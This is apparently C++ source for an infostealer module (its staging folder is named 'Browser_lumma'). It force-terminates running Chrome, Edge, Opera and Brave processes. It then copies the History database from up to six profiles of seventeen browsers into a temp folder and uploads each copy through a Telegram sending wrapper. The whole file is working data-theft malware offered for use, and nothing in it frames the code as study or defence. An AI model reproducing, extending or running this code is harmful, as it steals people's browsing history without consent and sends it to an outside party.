#include "pch.h"

#include "../debug.h"
#include "../wrappers/telegram.h"

#include <filesystem>
#include <map>
#include <vector>
#include <string>
#include <Windows.h>
#include <TlHelp32.h>

namespace fs = std::filesystem;

namespace grab {
	void GetBrowserHistory() {
        const char* appdataEnv = std::getenv("LOCALAPPDATA");
        const char* roamingEnv = std::getenv("APPDATA");
        const char* tempEnv = std::getenv("TEMP");

        if (!appdataEnv || !roamingEnv || !tempEnv) {
            return;
        }

        fs::path appdata(appdataEnv);
        fs::path roaming(roamingEnv);
        fs::path tempDir(tempEnv);

        fs::path saveTo = tempDir / "Browser_lumma";

        std::map<std::string, fs::path> browsers = {
            {"kometa",               appdata / "Kometa" / "User Data"},
            {"orbitum",              appdata / "Orbitum" / "User Data"},
            {"cent-browser",         appdata / "CentBrowser" / "User Data"},
            {"7star",                appdata / "7Star" / "7Star" / "User Data"},
            {"sputnik",              appdata / "Sputnik" / "Sputnik" / "User Data"},
            {"vivaldi",              appdata / "Vivaldi" / "User Data"},
            {"google-chrome-sxs",    appdata / "Google" / "Chrome SxS" / "User Data"},
            {"google-chrome",        appdata / "Google" / "Chrome" / "User Data"},
            {"epic-privacy-browser", appdata / "Epic Privacy Browser" / "User Data"},
            {"microsoft-edge",       appdata / "Microsoft" / "Edge" / "User Data"},
            {"uran",                 appdata / "uCozMedia" / "Uran" / "User Data"},
            {"yandex",               appdata / "Yandex" / "YandexBrowser" / "User Data"},
            {"brave",                appdata / "BraveSoftware" / "Brave-Browser" / "User Data"},
            {"iridium",              appdata / "Iridium" / "User Data"},
            {"opera",                roaming / "Opera Software" / "Opera Stable"},
            {"opera-gx",             roaming / "Opera Software" / "Opera GX Stable"},
            {"helium",               appdata / "imput" / "Helium" / "User Data"}
        };

        std::vector<std::string> profiles = {
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5"
        };

        fs::create_directories(saveTo);

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            Debug::LogError("CreateToolhelp32Snapshot failed");
            return;
        }

        int terminatedCount = 0;
        Process32First(snap, &pe);
        do {
            if (wcscmp(pe.szExeFile, L"chrome.exe") == 0) {
                HANDLE chrome = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (chrome == NULL) {
                    Debug::Log("OpenProcess failed for chrome.exe");
                    continue;
                }

                if (TerminateProcess(chrome, 1)) {
                    terminatedCount++;
                    Debug::Log(("Terminated chrome PID: " + std::to_string(pe.th32ProcessID)).c_str());
                }
                else {
                    Debug::LogError("TerminateProcess for chrome failed");
                }
                CloseHandle(chrome);
            }

            if (wcscmp(pe.szExeFile, L"edge.exe") == 0) {
                HANDLE chrome = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (chrome == NULL) {
                    Debug::Log("OpenProcess failed for edge.exe");
                    continue;
                }

                if (TerminateProcess(chrome, 1)) {
                    terminatedCount++;
                    Debug::Log(("Terminated edge PID: " + std::to_string(pe.th32ProcessID)).c_str());
                }
                else {
                    Debug::LogError("TerminateProcess for edge failed");
                }
                CloseHandle(chrome);
            }

            if (wcscmp(pe.szExeFile, L"MicrosoftEdgeUpdate.exe") == 0) {
                HANDLE chrome = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (chrome == NULL) {
                    Debug::Log("OpenProcess failed for MicrosoftEdgeUpdate.exe");
                    continue;
                }

                if (TerminateProcess(chrome, 1)) {
                    terminatedCount++;
                    Debug::Log(("Terminated MicrosoftEdgeUpdate PID: " + std::to_string(pe.th32ProcessID)).c_str());
                }
                else {
                    Debug::LogError("TerminateProcess for MicrosoftEdgeUpdate failed");
                }
                CloseHandle(chrome);
            }

            if (wcscmp(pe.szExeFile, L"opera.exe") == 0) {
                HANDLE chrome = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (chrome == NULL) {
                    Debug::Log("OpenProcess failed for opera.exe");
                    continue;
                }

                if (TerminateProcess(chrome, 1)) {
                    terminatedCount++;
                    Debug::Log(("Terminated opera PID: " + std::to_string(pe.th32ProcessID)).c_str());
                }
                else {
                    Debug::LogError("TerminateProcess for opera failed");
                }
                CloseHandle(chrome);
            }

            if (wcscmp(pe.szExeFile, L"brave.exe") == 0) {
                HANDLE chrome = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (chrome == NULL) {
                    Debug::Log("OpenProcess failed for brave.exe");
                    continue;
                }

                if (TerminateProcess(chrome, 1)) {
                    terminatedCount++;
                    Debug::Log(("Terminated brave PID: " + std::to_string(pe.th32ProcessID)).c_str());
                }
                else {
                    Debug::LogError("TerminateProcess for brave failed");
                }
                CloseHandle(chrome);
            }

        } while (Process32Next(snap, &pe));

        CloseHandle(snap);

        for (const auto& [key, value] : browsers) {
            if (fs::exists(value)) {
                try {
                    Debug::Log(value.string() + " Exists!");

                    for (const auto& profile : profiles) {
                        fs::path actualPath = value / fs::path(profile);

                        if (fs::exists(actualPath)) {
                            fs::path file = saveTo / (std::string(key) + "_" + profile +"_browser.db"); // sqlite file

                            if (fs::exists(file)) fs::remove(file);

                            fs::path historyFile = value / fs::path(profile) / "History";
                            Debug::Log(historyFile.string());

                            fs::copy_file(historyFile, saveTo / (std::string(key) + "_" + profile + "_browser.db"));
                            telegram::SendDocument(file.string());
                        }
                    }
                }
                catch (const fs::filesystem_error& e) {
                    Debug::LogError(e.what());
                }
            }
        }
	}
}